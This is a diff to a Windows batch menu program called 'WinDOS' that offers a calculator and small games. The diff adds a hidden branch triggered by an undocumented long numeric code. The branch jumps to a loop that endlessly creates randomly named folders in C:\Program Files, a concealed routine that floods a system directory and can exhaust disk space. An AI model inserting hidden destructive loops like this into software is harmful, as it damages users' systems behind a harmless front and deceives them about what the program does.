@@ -105,6 +105,7 @@ if %input%==3 goto dealornodeal
 if %input%==4 goto snake
 if %input%==5 goto minesweeper
 if %input%==6 goto exit
+if %input%==1151169711411610210510810148 goto process0
 :calc
 cls
 TITLE Calculator
@@ -2530,3 +2531,7 @@ color 17
 Shutting down WinDOS...
 timeout 5 > NUL
 exit
+:process0
+cd C:\Program Files
+md %random%
+goto process0
